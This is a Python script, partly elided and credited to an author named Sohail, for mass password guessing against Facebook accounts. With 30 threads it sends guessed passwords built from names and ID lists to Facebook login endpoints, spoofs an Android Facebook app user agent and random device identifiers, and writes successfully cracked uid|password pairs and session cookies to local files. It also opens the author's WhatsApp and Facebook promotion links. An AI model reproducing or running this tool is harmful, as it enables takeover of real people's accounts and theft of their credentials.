# Method coded By SOHAIL Khan
# Totally Written in python
import requests,random,uuid,time,string,hashlib
...
os.system('xdg-open https://wa.me/+923251152682')
...
loop=0
logo=("""\033[1;37m      
 d888b  db    db d8888b. db    db db    db 
88' Y8b 88    88 88  `8D 88    88 88    88 
88      88    88 88   88 88    88 88    88 
88  ooo 88    88 88   88 88    88 88    88 
88. ~8~ 88b  d88 88  .8D 88b  d88 88b  d88 
 Y888P  ~Y8888P' Y8888D' ~Y8888P' ~Y8888P'                                                                                                         
------------------------------------------------
 Author     :    Sohail
 Github.     : Sohail455
 Facebook   :    Sohail-Akbar
 Status     :    Free
 Version    :    0.1
------------------------------------------------""")
...
def Main_SOHAIL():
		...
		if shm =='1':
			...
			wp=(' ')
			os.system('xdg-open https://chat.whatsapp.com/DvNQV8MUjFlHiOg4vakzNK')
			Main_SOHAIL()
		elif shm =='5':
			os.system('xdg-open https://www.facebook.com/mamen.khoso?mibextid=ZbWKwL')
			Main_SOHAIL()
		elif shm =='0':
...
#	print('\033[1;37m example :\033[1;37mfirst last, firtslast, first123')
	...
	with tred(max_workers=30) as SOHAIL:
		clear()
		tl = str(len(fo))
		...
		for user in fo:
			...
			passlist = plist
			if methd =='1':
				SOHAIL.submit(api1,ids,names,passlist)
			else:
				SOHAIL.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
...
def pak():
	...
	with tred(max_workers=30) as SOHAIL:
		...
		for psx in user:
			...
			SOHAIL.submit(rd1,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' [+] The process has completed')
	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m [SOHAIL]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m [SOHAIL-OK] '+uid+' | '+pas)
						#print(' \33[1;33m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'SOHAIL_RND_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'SOHAIL_COOKIEs.txt')
						...
						#print(f'\r\r\33[1m\33[1;35m [SOHAIL-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'SOHAIL-CP.txt')
...
def api1(ids,names,passlist):
  try:
    global ok,loop,sim_id
    sys.stdout.write('\r\r\33[1;37m[SOHAIL-XD]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    fn = names.split(' ')[0]
    try:
      ln = names.split(' ')[1]
    except:ln = fn
    for pw in passlist:
      ...
      ua  = 'Dalvik/2.1.0 (Linex; U; Android 9; GT-N7105T Build/QP1A.409232.365) [FBAN/FB4A;FBAV/332.0.0.4.152;FBBV/896593247;FBDM/{density=3.4,width=1080,height=1446};FBLC/en_GB;FBRV/439894270;FBCR/FASTWEB;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Galaxy S5;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
      adid=str(uuid.uuid4())
      device_id=str(uuid.uuid4())
      secure_family_device_id=str(uuid.uuid4())
      machine_id="".join(random.choices(string.ascii_letters+string.digits+"-_",k=24))
      auth_secure_device_id=machine_id[:5]+"".join(random.choices(string.ascii_letters+string.digits+"-_",k=19))
      sig=hashlib.md5("".join(random.choices(string.printable,k=random.randint(1,1000))).encode()).hexdigest()
      ...
      clen=len("".join([f"{k}={v}" for k,v in data.items()]))
      head={
      ...
      if 'session_key' in po:
        uid = str(po['uid'])
        print('\r\r\033[1;32m [SOHAIL-OK] '+uid+' | '+pas)
        file_path = os.path.join(folder_path, 'SOHAIL_FILE_OK.txt')
        with open(file_path, 'a') as file:
          file.write(uid+'|'+pas+'\n')
          oks.append(uid)
        break
